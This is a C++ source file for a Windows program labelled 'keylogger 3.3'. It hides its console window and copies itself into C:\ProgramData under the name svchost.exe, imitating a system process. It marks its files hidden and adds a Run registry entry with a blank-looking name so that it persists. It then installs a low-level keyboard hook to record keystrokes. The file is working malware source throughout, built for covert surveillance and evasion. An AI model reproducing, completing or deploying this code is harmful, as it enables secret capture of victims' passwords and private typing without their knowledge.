#define _CRT_SECURE_NO_WARNINGS

// keylogger 3.3 (maybe stable :) )

#include "KeyloggerFunctions.h"

int wmain(int argc, wchar_t** argv)
{

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	if (argc == 1)
	{
		std::wstring wstr(argv[0]);
		wstr += L" --1";
		CreateNoKillProcess(const_cast<wchar_t*>(wstr.c_str()));
		//CreateProcessA(nullptr, const_cast<char*>(strTo.c_str()), nullptr, nullptr, FALSE, NULL, nullptr, nullptr, new STARTUPINFOA{ 0 }, new PROCESS_INFORMATION{ 0 });
		return 0;
	}
	else if (argc == 2)
	{
		if (!wcscmp(argv[1], L"--1"))
		{
			HKEY key;
			RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key);
			DeleteFile(L"C:\\ProgramData\\svchost.exe");
			CopyFile(argv[0], L"C:\\ProgramData\\svchost.exe", FALSE);
			CopyFile(L"msvcp140.dll", L"C:\\ProgramData\\msvcp140.dll", FALSE);
			CopyFile(L"vcruntime140.dll", L"C:\\ProgramData\\vcruntime140.dll", FALSE);
			SetFileAttributes(L"C:\\ProgramData\\svchost.exe", FILE_ATTRIBUTE_HIDDEN);
			SetFileAttributes(L"C:\\ProgramData\\msvcp140.dll", FILE_ATTRIBUTE_HIDDEN);
			SetFileAttributes(L"C:\\ProgramData\\vcruntime140.dll", FILE_ATTRIBUTE_HIDDEN);
			std::wstring str(L"C:\\ProgramData\\svchost.exe --2");
			RegSetValueEx(key, L"   ", 0, REG_SZ, reinterpret_cast<const BYTE*>(str.c_str()), static_cast<DWORD>((str.size() + 1) * sizeof(wchar_t)));
			CreateFile(argv[0], NULL, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
			return 0;
		}
		else if (!wcscmp(argv[1], L"--2"))
		{
			std::wstring wstr(argv[0]);
			wstr += L" --3";
			CreateNoKillProcess(const_cast<wchar_t*>(wstr.c_str()));
			return 0;
		}
		else if (!wcscmp(argv[1], L"--3"))
		{
			goto start;
		}
		else
		{
			CreateProcess(nullptr, argv[1], nullptr, nullptr, FALSE, NULL, nullptr, nullptr, new STARTUPINFO{ 0 }, new PROCESS_INFORMATION{ 0 });
			std::wstring wstr(argv[0]);
			wstr += L" --3";
			CreateNoKillProcess(const_cast<wchar_t*>(wstr.c_str()));
			return 0;
		}
	}

start:

	std::wcout << L"run...\n";

	delete_daily();

	MSG msg{0};

	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		LogKeyW, NULL, NULL);

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hHook);

	return 0;
}
